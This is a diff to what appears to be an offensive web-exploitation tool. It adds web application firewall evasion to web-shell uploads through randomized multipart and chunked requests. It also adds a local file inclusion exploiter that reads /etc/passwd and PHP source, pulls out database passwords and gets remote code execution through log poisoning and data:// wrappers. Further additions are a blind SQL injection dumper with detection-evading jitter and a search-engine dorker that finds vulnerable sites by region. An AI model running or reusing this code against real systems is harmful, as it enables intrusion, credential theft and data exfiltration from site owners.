@@ -15,8 +15,26 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from urllib.parse import urlparse, parse_qs, urljoin
 from queue import Queue
 from html import escape
+import bs4
+import concurrent.futures
 
-VERSION = "1.2.0"
+def phase_timeout(seconds):
+    """Decorator to enforce a timeout on a phase function."""
+    def decorator(func):
+        def wrapper(*args, **kwargs):
+            ex = concurrent.futures.ThreadPoolExecutor(max_workers=1)
+            fut = ex.submit(func, *args, **kwargs)
+            try:
+                return fut.result(timeout=seconds)
+            except concurrent.futures.TimeoutError:
+                print(f"  {Y}⚠ Phase timed out ({seconds}s){N}")
+                return None
+            finally:
+                ex.shutdown(wait=False)  # don't block waiting for the thread
+        return wrapper
+    return decorator
+
+VERSION = "1.3.0"
 
 R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
 B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
@@ -84,6 +102,10 @@ class BypassEngine:
         self._session = requests.Session()
         self._session.verify = False
         if proxy: self._session.proxies = {"http": proxy, "https": proxy}
+        retry = requests.adapters.Retry(total=1, connect=1, read=1, backoff_factor=0.1)
+        adapter = requests.adapters.HTTPAdapter(max_retries=retry)
+        self._session.mount("http://", adapter)
+        self._session.mount("https://", adapter)
         self._detect_waf(); self._build_headers()
 
     def check_connection(self):
@@ -228,10 +250,12 @@ class BypassEngine:
     def get(self, url, **kwargs):
         hdrs = {**self.bypass_headers, "User-Agent": random.choice(self.ua_list), **kwargs.pop("headers", {})}
         if self.waf_detected: hdrs["X-Forwarded-For"] = self._rand_ip()
+        kwargs.setdefault("timeout", (5, 8))  # (connect, read)
         return self._session.get(url, headers=hdrs, **kwargs)
 
     def post(self, url, **kwargs):
         hdrs = {**self.bypass_headers, "User-Agent": random.choice(self.ua_list), **kwargs.pop("headers", {})}
+        kwargs.setdefault("timeout", (5, 8))
         return self._session.post(url, headers=hdrs, **kwargs)
 
     def info(self):
@@ -2710,24 +2734,77 @@ print("<pre>"+sp.getoutput(c)+"</pre>")""",
                 except: pass
         return None
 
+    def _rand_boundary(self):
+        return "----WebKitFormBoundary" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
+
+    def _rand_ct(self):
+        return random.choice(["image/jpeg", "image/png", "image/gif", "application/octet-stream", "text/plain"])
+
+    def _chunked_post(self, url, data, headers):
+        """Send with random chunked encoding."""
+        try:
+            chunks = [data[i:i+random.randint(4,16)] for i in range(0, len(data), random.randint(4,16))]
+            body = "".join(f"{len(c):x}\r\n{c}\r\n" for c in chunks) + "0\r\n\r\n"
+            hdrs = {**headers, "Transfer-Encoding": "chunked", "Content-Type": "application/x-www-form-urlencoded"}
+            return requests.post(url, data=body, headers=hdrs, timeout=6, verify=False)
+        except: return None
+
     # ── TECHNIQUE 2: POST multipart to endpoints ──
     def _try_post_endpoints(self, shell):
         base_clean = self.base + self.dir_path
+        field_names = ["file", "upload", "image", "Filedata", "userfile", "images", "photo", "qqfile", "file_upload", "myfile"]
+        ct_types = ["image/jpeg", "image/png", "image/gif", "application/x-php", "application/octet-stream"]
         for base in set([base_clean, self.base]):
             for ep in self.UPLOAD_ENDPOINTS:
-                for fn, ct in [("file", "image/jpeg"), ("file", "application/x-php"),
-                               ("file", "text/plain"), ("uploaded", "image/jpeg"),
-                               ("image", "image/jpeg"), ("Filedata", "image/jpeg"),
-                               ("userfile", "image/jpeg"), ("images", "image/jpeg")]:
-                    try:
-                        r = requests.post(base+ep, files={fn: (shell["fn"], shell["code"], ct)},
-                            timeout=6, verify=False,
-                            headers={"User-Agent": random.choice(self.bypass.ua_list)})
-                        if r.status_code in (200,201,204):
-                            for test_base in [base, self.base]:
-                                vu = test_base.rstrip("/") + "/" + shell["fn"]
-                                if self._vfy(vu): return vu
-                    except: pass
+                fn = random.choice(field_names)
+                ct = random.choice(ct_types)
+                boundary = self._rand_boundary()
+                hdrs = {**self.bypass.bypass_headers,
+                        "User-Agent": random.choice(self.bypass.ua_list),
+                        "Content-Type": f"multipart/form-data; boundary={boundary}",
+                        "Accept": random.choice(["*/*", "text/html", "application/json"]),
+                        "X-Requested-With": random.choice(["XMLHttpRequest", ""])}
+                body = (
+                    f"--{boundary}\r\n"
+                    f"Content-Disposition: form-data; name=\"{fn}\"; filename=\"{shell['fn']}\"\r\n"
+                    f"Content-Type: {ct}\r\n\r\n"
+                    f"{shell['code']}\r\n"
+                    f"--{boundary}--\r\n"
+                )
+                try:
+                    r = requests.post(base+ep, data=body, headers=hdrs, timeout=6, verify=False)
+                    if r.status_code in (200,201,204):
+                        for test_base in [base, self.base]:
+                            vu = test_base.rstrip("/") + "/" + shell["fn"]
+                            if self._vfy(vu): return vu
+                except: pass
+        return None
+
+    # ── TECHNIQUE 2b: POST multipart with chunked encoding ──
+    def _try_post_chunked(self, shell):
+        base_clean = self.base + self.dir_path
+        for base in set([base_clean, self.base]):
+            for ep in ["/upload.php", "/api/upload", "/upload"]:
+                boundary = self._rand_boundary()
+                body = (
+                    f"--{boundary}\r\n"
+                    f"Content-Disposition: form-data; name=\"file\"; filename=\"{shell['fn']}\"\r\n"
+                    f"Content-Type: image/jpeg\r\n\r\n"
+                    f"{shell['code']}\r\n"
+                    f"--{boundary}--\r\n"
+                )
+                chunks = [body[i:i+random.randint(8,32)] for i in range(0, len(body), random.randint(8,32))]
+                chunked_body = "".join(f"{len(c):x}\r\n{c}\r\n" for c in chunks) + "0\r\n\r\n"
+                hdrs = {**self.bypass.bypass_headers,
+                        "User-Agent": random.choice(self.bypass.ua_list),
+                        "Content-Type": f"multipart/form-data; boundary={boundary}",
+                        "Transfer-Encoding": "chunked"}
+                try:
+                    r = requests.post(base+ep, data=chunked_body, headers=hdrs, timeout=8, verify=False)
+                    if r.status_code in (200,201,204):
+                        vu = base.rstrip("/") + "/" + shell["fn"]
+                        if self._vfy(vu): return vu
+                except: pass
         return None
 
     # ── TECHNIQUE 3: POST with form field ──
@@ -2735,12 +2812,14 @@ print("<pre>"+sp.getoutput(c)+"</pre>")""",
         for base in [self.base, self.base + self.dir_path]:
             if "?" in base: continue
             for ep in ["", "/upload", "/save", "/index.php", "/api"]:
-                for fn in ["file", "upload", "image", "Filedata", "userfile", "files[]", "photo"]:
+                for fn in ["file", "upload", "image", "Filedata", "userfile", "files[]", "photo", "file_upload", "user_file"]:
                     try:
                         r = requests.post(base+ep,
                             data={fn: (shell["fn"], shell["code"])},
                             timeout=6, verify=False,
-                            headers={"User-Agent": random.choice(self.bypass.ua_list)})
+                            headers={**self.bypass.bypass_headers,
+                                     "User-Agent": random.choice(self.bypass.ua_list),
+                                     "Content-Type": "multipart/form-data; boundary=" + self._rand_boundary()})
                         if r.status_code in (200,201,204):
                             vu = base.rstrip("/") + "/" + shell["fn"]
                             if self._vfy(vu): return vu
@@ -2927,6 +3006,7 @@ print("<pre>"+sp.getoutput(c)+"</pre>")""",
         techniques = [
             ("PUT writable dir", self._try_put),
             ("POST upload endpoints", self._try_post_endpoints),
+            ("POST chunked", self._try_post_chunked),
             ("POST form field", self._try_post_form),
             ("POST JSON base64", self._try_post_json),
             (".htaccess bypass", self._try_htaccess_bypass),
@@ -3056,97 +3136,202 @@ class LFIExploiter:
         new = urllib.parse.urlencode({k: (payload if k == self.param else v[0]) for k, v in self.params.items()})
         return f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
 
-    def read_file(self, path):
-        u = self._build(path)
-        r = self.bypass.get(u, timeout=10, allow_redirects=False)
-        if r and (r.status_code == 200 or "root:" in (r.text or "")):
-            return r.text
+    def _generate_payloads(self, path):
+        """Generate multiple encoding variants of a path for WAF bypass."""
+        p = path
+        seen = set()
+        variants = []
+        def add(v):
+            if v not in seen:
+                seen.add(v)
+                variants.append(v)
+        add(p)  # raw
+        if "../" in p:
+            add(p.replace("../", "....//"))  # WAF dot-dot bypass
+            add(p.replace("../", "..;/"))  # IIS bypass
+            add(p.replace("../", "..%252f"))  # double encode
+            add(p.replace("../", "..\\"))  # backslash
+            add(p.replace("../", "").replace("../../", "../"))  # nested
+            add("/" + p.lstrip(".").lstrip("/"))  # absolute
+        else:
+            add(p.replace("/", "%2f"))  # single encode absolute path
+            add("....//....//....//....//" + p.lstrip("/"))  # dot-dot absolute
+            add("..;/..;/..;/..;/" + p.lstrip("/"))  # IIS absolute
+        add(p + "%00")  # null byte
+        add(p.rstrip("/") + "/.")  # trailing dot
+        if p.startswith("/"):
+            add("php://filter/convert.base64-encode/resource=" + p.lstrip("/"))
+        for v in variants:
+            yield v
+
+    def read_file(self, path, max_attempts=12):
+        for i, variant in enumerate(self._generate_payloads(path)):
+            if i >= max_attempts: break
+            u = self._build(variant)
+            try:
+                r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
+            except: continue
+            if r and r.status_code == 200:
+                txt = r.text or ""
+                if any(kw in txt for kw in ["root:x:", "daemon:x:", "www-data:x:", "nobody:x:", "# MySQL dump", "<?php"]):
+                    return txt
+                if len(txt) > 100 and not txt.startswith("<!DOCTYPE") and not txt.startswith("<html"):
+                    return txt
         return None
 
     def read_etc_passwd(self):
-        result = self.read_file("../../../../../../etc/passwd")
-        if result and "root:x:" in result:
-            print(f"  {G}[✔]{N} Read /etc/passwd!")
-            users = re.findall(r'^([^:]+):', result, re.M)
-            print(f"  {D}Users: {', '.join(users)}{N}")
-            return result
-        result2 = self.read_file("/etc/passwd")
-        if result2 and "root:x:" in result2:
-            print(f"  {G}[✔]{N} Read /etc/passwd!")
-            return result2
+        results = []
+        for path in ["/etc/passwd", "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
+                      "....//....//....//....//etc/passwd", "/etc/hosts", "/etc/issue"]:
+            for i, variant in enumerate(self._generate_payloads(path)):
+                if i >= 6: break
+                u = self._build(variant)
+                try:
+                    r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
+                except: continue
+                if r and r.status_code == 200 and (txt := r.text or ""):
+                    if "root:x:" in txt:
+                        print(f"  {G}✔{N} /etc/passwd ({path[:35]}...)")
+                        users = re.findall(r'^([^:]+):', txt, re.M)
+                        print(f"  {D}Users: {', '.join(users[:10])}{N}")
+                        results.append(("passwd", txt))
+                        return "\n".join(r[1] for r in results)
+                    if "127.0.0.1" in txt and "localhost" in txt:
+                        print(f"  {G}✔{N} /etc/hosts readable!")
+                        results.append(("hosts", txt))
+                    if "Ubuntu" in txt or "Debian" in txt:
+                        print(f"  {G}✔{N} /etc/issue: {Y}{txt.strip()}{N}")
+                        results.append(("issue", txt))
+                if results: break
+            if results: break
+        if results:
+            return "\n".join(r[1] for r in results)
         return None
 
     def read_php_source(self, path="index"):
-        for payload in [
+        wrappers = [
             f"php://filter/convert.base64-encode/resource={path}",
             f"php://filter/convert.base64-encode/resource={path}.php",
             f"php://filter/read=convert.base64-encode/resource={path}",
-        ]:
+            f"php://filter/convert.base64-encode/resource={path}.php%00",
+            f"PHP://filter/convert.base64-encode/resource={path}",
+            f"pHp://FiLter/convert.base64-encode/resource={path}",
+        ]
+        payloads = list(self._generate_payloads(path))
+        payloads.extend(wrappers)
+        seen = set()
+        for payload in payloads:
+            if payload in seen: continue
+            seen.add(payload)
             result = self.read_file(payload)
-            if result:
-                b64 = re.search(r'([A-Za-z0-9+/=]{50,})', result)
-                if b64:
-                    try:
-                        decoded = base64.b64decode(b64.group(1)).decode()
-                        print(f"  {G}[✔]{N} Source of {Y}{path}{N}:")
+            if not result: continue
+            b64s = re.findall(r'([A-Za-z0-9+/=]{80,})', result)
+            for b64 in b64s:
+                try:
+                    decoded = base64.b64decode(b64).decode()
+                    if "<?php" in decoded or "<?=" in decoded:
+                        print(f"  {G}✔{N} Source of {Y}{path}{N}:")
                         print(f"  {D}{'─'*40}{N}")
                         for line in decoded.split("\n")[:30]:
                             print(f"  {W}{line}{N}")
+                        if "DB_PASSWORD" in decoded or "db_password" in decoded:
+                            pwds = re.findall(r"['\"]?(?:DB_)?PASSWORD['\"]?\s*[=:]\s*['\"]([^'\"]+)", decoded, re.I)
+                            if pwds:
+                                print(f"  {R}⚠{N} {BOLD}CREDENTIALS: {', '.join(pwds)}{N}")
                         return decoded
-                    except: pass
+                except: pass
         return None
 
     def log_poison_rce(self, cmd="id", log_path=None):
-        """Attempt RCE via Apache log poisoning."""
-        if not log_path:
-            candidates = [
-                "../../../../../../var/log/apache2/access.log",
-                "../../../../../../var/log/httpd/access_log",
-                "../../../../../../var/log/apache/access.log",
-                "../../../../../../var/log/nginx/access.log",
-                "../../../../../../var/log/apache2/access_log",
-                "/var/log/apache2/access.log",
-                "/var/log/httpd/access_log",
-            ]
-        else:
-            candidates = [log_path]
+        logs = log_path and [log_path] or [
+            "../../../../../../var/log/apache2/access.log",
+            "../../../../../../var/log/httpd/access_log",
+            "../../../../../../var/log/apache/access.log",
+            "../../../../../../var/log/nginx/access.log",
+            "../../../../../../var/log/apache2/error.log",
+            "../../../../../../var/log/httpd/error_log",
+            "../../../../../../var/log/nginx/error.log",
+            "../../../../../../var/log/auth.log",
+            "../../../../../../var/log/messages",
+            "/var/log/apache2/access.log",
+            "/var/log/nginx/access.log",
+            "/proc/self/environ",
+        ]
+        for fd in range(0, 20):
+            logs.append(f"../../../../../../proc/self/fd/{fd}")
 
-        # Inject payload into log via User-Agent
+        php_payload = f"<?php system('{cmd}'); ?>"
+        ua_headers = {
+            "User-Agent": php_payload,
+            "Referer": php_payload,
+            "Cookie": f"PHPSESSID={php_payload}",
+            "X-Forwarded-For": php_payload,
+            "X-Forwarded-Host": php_payload,
+        }
+        # Inject via multiple headers
+        for hdr_name, hdr_val in ua_headers.items():
+            try:
+                requests.get(self.url, headers={hdr_name: hdr_val}, timeout=3, verify=False)
+            except: pass
+
+        # Inject with POST method too
         try:
-            inject_url = self.url
-            ua_payload = f"<?php system('{cmd}'); ?>"
-            requests.get(inject_url, headers={"User-Agent": ua_payload}, timeout=5, verify=False)
+            requests.post(self.url, data={self.param: "1"}, headers=ua_headers, timeout=3, verify=False)
         except: pass
 
-        for log in candidates:
-            result = self.read_file(log)
-            if result and ("GET" in result or "POST" in result):
-                # Check if our payload executed
-                if cmd in result:
-                    print(f"  {R}[!]{N} {BOLD}RCE via log poisoning!{N}")
-                    print(f"  {D}Log: {Y}{log}{N}")
-                    after_log = result.split(cmd)[-1][:200] if cmd in result else result[:200]
-                    print(f"  {W}Output: {after_log}{N}")
-                    return result
-                print(f"  {Y}[!]{N} Log readable: {Y}{log}{N}")
-                print(f"  {D}Payload may need second request to trigger{N}")
-                return result
+        for log in logs:
+            for variant in self._generate_payloads(log):
+                u = self._build(variant)
+                try:
+                    r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
+                except: continue
+                if r and (txt := r.text or ""):
+                    if ("GET" in txt or "POST" in txt or "HTTP/" in txt) and len(txt) > 50:
+                        if cmd in txt:
+                            print(f"  {R}⚡{N} {BOLD}RCE via {log.split('/')[-1]}!{N}")
+                            output = txt.split(cmd)[-1][:200] if cmd in txt else txt[:200]
+                            print(f"  {W}{output}{N}")
+                            return txt
+                        if not any(x in txt[:50] for x in ["<!DOCTYPE","<html","<head"]):
+                            print(f"  {Y}⚠{N} Log readable: {Y}{log.split('/')[-1]}{N}")
+                            print(f"  {D}Send another request, then re-run this phase{N}")
+                            return txt
+                if r and r.status_code == 200:
+                    break
         return None
 
     def proc_environ_rce(self, cmd="id"):
-        """Try /proc/self/environ RCE."""
-        result = self.read_file("../../../../../../proc/self/environ")
+        try:
+            result = self.read_file("../../../../../../proc/self/environ")
+        except: result = None
         if result and "HTTP_USER_AGENT" in result:
-            print(f"  {Y}[!]{N} /proc/self/environ readable! Injecting payload...")
-            inject_url = self.url
-            ua = f"<?php system('{cmd}'); ?>"
+            print(f"  {Y}⚠{N} /proc/self/environ readable! Injecting...")
             try:
-                requests.get(inject_url, headers={"User-Agent": ua}, timeout=5, verify=False)
+                requests.get(self.url, headers={"User-Agent": f"<?php system('{cmd}'); ?>", "X-Forwarded-For": f"<?php system('{cmd}'); ?>"}, timeout=3, verify=False)
             except: pass
-            result2 = self.read_file("../../../../../../proc/self/environ")
-            if result2 and cmd in result2:
-                print(f"  {R}[!]{N} {BOLD}RCE via /proc/self/environ!{N}")
-                return result2
+            try:
+                for variant in self._generate_payloads("../../../../../../proc/self/environ"):
+                    u = self._build(variant)
+                    try:
+                        r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
+                    except: continue
+                    if r and (txt := r.text or "") and cmd in txt:
+                        print(f"  {R}⚡{N} {BOLD}RCE via /proc/self/environ!{N}")
+                        return txt
+            except: pass
+        return None
+
+    def _try_data_wrapper(self, cmd="id"):
+        """PHP input wrapper RCE via data://."""
+        b64 = base64.b64encode(f"<?php system('{cmd}'); ?>".encode()).decode()
+        for payload in [f"data://text/plain;base64,{b64}", f"php://input&cmd={cmd}"]:
+            u = self._build(payload)
+            try:
+                r = self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
+            except: continue
+            if r and (txt := r.text or "") and cmd in txt:
+                print(f"  {R}⚡{N} {BOLD}RCE via data wrapper!{N}")
+                return txt
         return None
 
     def scan(self):
@@ -3157,32 +3342,47 @@ class LFIExploiter:
         if self.bypass.connect_error:
             print(f"\n  {R}✘{N} Target unreachable.\n"); return None
 
-        print(f"\n  {BOLD}{C}PHASE 1: READ /etc/passwd{N}")
-        passwd = self.read_etc_passwd()
-        if not passwd:
-            print(f"  {Y}⚠{N} /etc/passwd not readable via LFI")
+        print(f"\n  {BOLD}{C}PHASE 1: FILE READ{N}")
+        for fname in ["/etc/passwd", "/etc/hosts", "/etc/issue", "/proc/self/environ"]:
+            result = self.read_file(fname)
+            if result and "root:x:" in result:
+                print(f"  {G}✔{N} /etc/passwd: {len(result)} bytes")
+                users = re.findall(r'^([^:]+):', result, re.M)
+                print(f"  {D}Users: {', '.join(users[:8])}{N}")
+            elif result and "127.0.0.1" in result:
+                print(f"  {G}✔{N} /etc/hosts readable")
+            elif result and "HTTP_USER_AGENT" in result:
+                print(f"  {Y}⚠{N} /proc/self/environ readable — can inject RCE")
 
         print(f"\n  {BOLD}{C}PHASE 2: PHP SOURCE LEAK{N}")
-        for target in ["index", "config", "admin", "login", "wp-config"]:
+        found_src = False
+        for target in ["index", "config", "admin", "login", "wp-config", "db", "settings", ".env"]:
             src = self.read_php_source(target)
             if src:
-                if "DB_PASSWORD" in src or "db_password" in src:
-                    pwds = re.findall(r"['\"]?DB_PASSWORD['\"]?\s*,\s*['\"]([^'\"]+)", src, re.I)
-                    if pwds:
-                        print(f"  {R}[!]{N} {BOLD}DATABASE CREDENTIALS LEAKED!{N}")
-                        for p in pwds:
-                            print(f"      {Y}{p}{N}")
+                found_src = True
                 break
+        if not found_src:
+            print(f"  {Y}⚠{N} No PHP source leaked")
+
+        rce_success = False
 
         print(f"\n  {BOLD}{C}PHASE 3: LOG POISONING → RCE{N}")
         rce = self.log_poison_rce()
-        if not rce:
+        if rce: rce_success = True
+
+        if not rce_success:
             rce = self.proc_environ_rce()
-        if not rce:
-            print(f"  {Y}⚠{N} Could not achieve RCE via LFI")
+            if rce: rce_success = True
+
+        if not rce_success:
+            rce = self._try_data_wrapper()
+            if rce: rce_success = True
+
+        if not rce_success:
+            print(f"  {Y}⚠{N} LFI RCE failed (try --proxy or different param)")
 
         print()
-        return passwd
+        return rce or ""
 
 
 # ══════════════════════════════════════════════════════
@@ -3315,59 +3515,98 @@ class BlindSQLiExploiter:
         self.params = parse_qs(self.parsed.query) if parse_qs(self.parsed.query) else {}
         self.data = {}
         self.baseline_len = 0
-        self.baseline_text = ""
         self.diff_true = 0
         self.diff_false = 0
-        self.use_time = False
+        self.use_time = technique == "time"
+        self.req_count = 0
 
-    def _req(self, payload):
+    def _jitter(self):
+        time.sleep(random.uniform(0.3, 0.9))
+
+    def _payloads(self, condition):
+        variants = [
+            f"1' AND {condition}-- -",
+            f"1\" AND {condition}-- -",
+            f"1 AND {condition}-- -",
+            f"1') AND {condition}-- -",
+            f"1\") AND {condition}-- -",
+            f"1' AND {condition}#",
+            f"1' AND {condition}-- ",
+            f"1' AND {condition}/*",
+        ]
+        return variants
+
+    def _req(self, payload, retry=2):
+        if self.bypass.connect_error: return None
         new = urllib.parse.urlencode({k: (payload if k == self.param else v[0]) for k, v in self.params.items()})
         u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
-        try:
-            return self.bypass.get(u, timeout=15, allow_redirects=False)
-        except: return None
+        for _ in range(retry):
+            try:
+                self.req_count += 1
+                return self.bypass.get(u, timeout=(4, 6), allow_redirects=False)
+            except: time.sleep(1)
+        return None
 
     def _setup(self):
-        r = self._req(str(random.randint(0,9999)))
+        r = self._req(str(random.randint(1,99999)))
         if not r: return False
         self.baseline_len = len(r.text or "")
+        self._jitter()
 
-        r_true = self._req(f"1' AND 1=1-- -") or self._req(f"1 AND 1=1")
-        if not r_true: return False
-        self.diff_true = abs(len(r_true.text or "") - self.baseline_len)
+        for variant in self._payloads("1=1"):
+            r_true = self._req(variant)
+            if r_true:
+                self.diff_true = abs(len(r_true.text or "") - self.baseline_len)
+                break
+        if not self.diff_true:
+            for variant in ["1 AND 1=1", "admin' OR '1'='1"]:
+                r_true = self._req(variant)
+                if r_true: self.diff_true = abs(len(r_true.text or "") - self.baseline_len); break
+        if not self.diff_true: return False
 
-        r_false = self._req(f"1' AND 1=2-- -") or self._req(f"1 AND 1=2")
-        if not r_false: return False
-        self.diff_false = abs(len(r_false.text or "") - self.baseline_len)
+        self._jitter()
+        for variant in self._payloads("1=2"):
+            r_false = self._req(variant)
+            if r_false:
+                self.diff_false = abs(len(r_false.text or "") - self.baseline_len)
+                break
+        if not self.diff_false:
+            for variant in ["1 AND 1=2", "admin' AND '1'='2"]:
+                r_false = self._req(variant)
+                if r_false: self.diff_false = abs(len(r_false.text or "") - self.baseline_len); break
+        if not self.diff_false: return False
 
-        if abs(self.diff_true - self.diff_false) < 5 and self.diff_false < 50:
+        if abs(self.diff_true - self.diff_false) < 5:
             self.use_time = True
             return True
-
         return abs(self.diff_true - self.diff_false) > 3
 
     def _true(self, condition):
-        if self.use_time or self.technique == "time":
-            self.use_time = True
+        if self.bypass.connect_error: return False
+        if self.use_time:
             payload = f"1' AND IF({condition},SLEEP({self.delay}),0)-- -"
+            new = urllib.parse.urlencode({k: (payload if k == self.param else v[0]) for k, v in self.params.items()})
+            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
             try:
-                new = urllib.parse.urlencode({k: (payload if k == self.param else v[0]) for k, v in self.params.items()})
-                u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
                 start = time.time()
-                self.bypass.get(u, timeout=self.delay*3, allow_redirects=False)
-                return time.time() - start >= self.delay
+                self.bypass.get(u, timeout=self.delay*3+5, allow_redirects=False)
+                return time.time() - start >= self.delay * 0.8
             except: return False
         else:
-            payload = f"1' AND {condition}-- -"
-            r = self._req(payload)
-            if not r: return False
-            d = abs(len(r.text or "") - self.baseline_len)
-            return abs(d - self.diff_true) < abs(d - self.diff_false)
+            for variant in self._payloads(condition):
+                self._jitter()
+                r = self._req(variant)
+                if not r: continue
+                d = abs(len(r.text or "") - self.baseline_len)
+                if abs(d - self.diff_true) < abs(d - self.diff_false):
+                    return True
+            return False
 
     def _len(self, query):
-        for l in range(1, 256):
-            if self._true(f"LENGTH(({query}))={l}"):
-                return l
+        l = 1
+        while l <= 512:
+            if self._true(f"LENGTH(({query}))={l}"): return l
+            l += 1 if l < 32 else 5 if l < 100 else 20
         return 0
 
     def _chr(self, query, pos):
@@ -3380,7 +3619,7 @@ class BlindSQLiExploiter:
                 hi = mid
         return chr(lo)
 
-    def _extract(self, query, max_len=100):
+    def _extract(self, query, max_len=200):
         if not self._true(f"LENGTH(({query}))>0"):
             return None
         length = self._len(query)
@@ -3389,8 +3628,8 @@ class BlindSQLiExploiter:
         for pos in range(1, length + 1):
             ch = self._chr(query, pos)
             res += ch
-            if pos % 5 == 0:
-                print(f"      {D}[{pos}/{length}] {res}{' ' * 10}{N}", end="\r")
+            if pos % 3 == 0:
+                print(f"      {D}[{pos}/{length}] {res[-30:]}{' '*10}{N}", end="\r")
         return res
 
     def dump_all(self):
@@ -3404,20 +3643,19 @@ class BlindSQLiExploiter:
         print(f"\n  {BOLD}{C}CALIBRATE{N}")
         if not self._setup():
             print(f"  {R}✘{N} Calibration failed.\n"); return None
-        print(f"  {G}✔{N} {'Time-based' if self.use_time else 'Boolean-based'} injection detected!")
+        print(f"  {G}✔{N} {'Time' if self.use_time else 'Boolean'}-based injection! ({self.req_count} probe reqs)")
 
         print(f"\n  {BOLD}{C}DATABASE INFO{N}")
-        for name, sql in [("Version","SELECT @@version"),("Database","SELECT database()"),("User","SELECT user()")]:
+        for name, sql in [("Version","@@version"),("Database","database()"),("User","user()")]:
             print(f"  {C}▶{N} {Y}{name}{N}...")
-            v = self._extract(sql)
+            v = self._extract(f"SELECT {sql}")
             if v: print(f"\n  {G}✔{N} {name}: {Y}{v}{N}"); self.data[name.lower()] = v
 
         print(f"\n  {BOLD}{C}TABLES{N}")
         tables = []
-        for i in range(15):
+        for i in range(20):
             q = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {i}"
             if not self._true(f"EXISTS({q})"): break
-            print(f"  {C}▶{N} Table #{i+1}...")
             v = self._extract(q)
             if v: tables.append(v); print(f"\n  {G}✔{N} {Y}{v}{N}")
             else: break
@@ -3426,25 +3664,25 @@ class BlindSQLiExploiter:
         print(f"\n  {BOLD}{C}DATA DUMP{N}")
         for tbl in tables[:5]:
             cols = []
-            for i in range(15):
+            for i in range(20):
                 q = f"SELECT column_name FROM information_schema.columns WHERE table_name='{tbl}' LIMIT 1 OFFSET {i}"
                 if not self._true(f"EXISTS({q})"): break
                 v = self._extract(q)
-                if v: cols.append(v)
+                if v: cols.append(v) or print(f"\n  {G}→{N} col: {Y}{v}{N}")
                 else: break
             if not cols: continue
-            print(f"\n  {C}▶{N} {Y}{tbl}{N} cols: {', '.join(cols[:6])}")
             for ri in range(5):
                 q = f"SELECT {','.join(cols[:3])} FROM {tbl} LIMIT 1 OFFSET {ri}"
                 if not self._true(f"EXISTS({q})"): break
                 v = self._extract(q)
-                if v: print(f"      {G}→{N} {W}{v[:120]}{N}")
+                if v: print(f"      {G}→{N} {W}{v[:150]}{N}")
 
         fn = f"blind_sqli_{urlparse(self.url).netloc}.txt"
         with open(fn,"w") as f:
             for k,v in self.data.items():
                 f.write(f"[{k}]\n{v}\n")
-        print(f"\n  {G}✔{N} Saved: {Y}{fn}{N}\n")
+        print(f"\n  {G}✔{N} {self.req_count} requests | Saved: {Y}{fn}{N}")
+        print()
         return self.data
 
 
@@ -3833,6 +4071,117 @@ class ServiceExploiter:
 
 
 # ══════════════════════════════════════════════════════
+#  GOOGLE DORKER — Find targets via search engines
+# ══════════════════════════════════════════════════════
+
+class GoogleDorker:
+    DORKS = {
+        "sqli": ["inurl:php?id=", "inurl:asp?id=", "inurl:aspx?id=", "inurl:jsp?id=", "inurl:news.php?id="],
+        "lfi": ["inurl:index.php?file=", "inurl:page=include", "inurl:?page=../../"],
+        "rfi": ["inurl:?file=http://", "inurl:?page=http://", "inurl:?include=http://"],
+        "admin": ["inurl:/admin", "inurl:/administrator", "inurl:/login", "intitle:\"admin login\""],
+        "wp": ["inurl:/wp-admin", "inurl:/wp-content", "intitle:\"WordPress\" inurl:\"wp-\""],
+        "phpinfo": ["inurl:phpinfo.php", "intitle:\"phpinfo()\"", "ext:php intitle:phpinfo"],
+        "upload": ["inurl:upload.php", "inurl:file.php", "inurl:uploader", "inurl:filemanager"],
+        "cve": ["inurl:?option=com_", "inurl:?page=user", "inurl:?id=1 union"],
+        "config": ["ext:cfg \"database_password\"", "ext:sql \"INSERT INTO\"", "ext:env DB_PASSWORD"],
+        "all": ["inurl:php?id=", "inurl:admin", "inurl:upload.php", "intitle:phpinfo"],
+    }
+    REGION_DOMAINS = {"id": ".id", "my": ".my", "sg": ".sg", "jp": ".jp", "kr": ".kr",
+                      "cn": ".cn", "us": ".com", "uk": ".uk", "de": ".de", "fr": ".fr",
+                      "au": ".au", "br": ".br", "in": ".in", "ru": ".ru", "global": ""}
+
+    def __init__(self, dork=None, category="sqli", region="global", pages=2, proxy=None):
+        self.dork = dork
+        self.category = category
+        self.region = region
+        self.pages = min(pages, 5)
+        self.proxy = proxy
+        self.results = []
+        self.proxies = {"http": proxy, "https": proxy} if proxy else None
+
+    def _build_queries(self):
+        dorks = [self.dork] if self.dork else self.DORKS.get(self.category, self.DORKS["all"])
+        region_domain = self.REGION_DOMAINS.get(self.region, "")
+        if region_domain:
+            return [f"{d} site:{region_domain}" for d in dorks]
+        return dorks
+
+    def _search_ddgs(self, query, max_results=20):
+        """DuckDuckGo API via ddgs."""
+        from ddgs import DDGS
+        try:
+            with DDGS() as ddgs:
+                results = list(ddgs.text(query, max_results=max_results))
+                return [r.get("href","") for r in results if r.get("href")]
+        except: return []
+
+    def _validate(self, url, timeout=5):
+        try:
+            r = requests.get(url, timeout=timeout, allow_redirects=True, verify=False,
+                             headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+                             proxies=self.proxies)
+            if r.status_code in (200, 301, 302, 403):
+                t = ""
+                m = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I|re.S)
+                if m: t = m.group(1).strip()[:80]
+                return {"url": url, "status": r.status_code, "title": t,
+                        "server": r.headers.get("Server","")[:20],
+                        "ct": r.headers.get("Content-Type","")[:30]}
+        except: pass
+        return None
+
+    def run(self):
+        header("GOOGLE DORKER — TARGET DISCOVERY")
+        queries = self._build_queries()
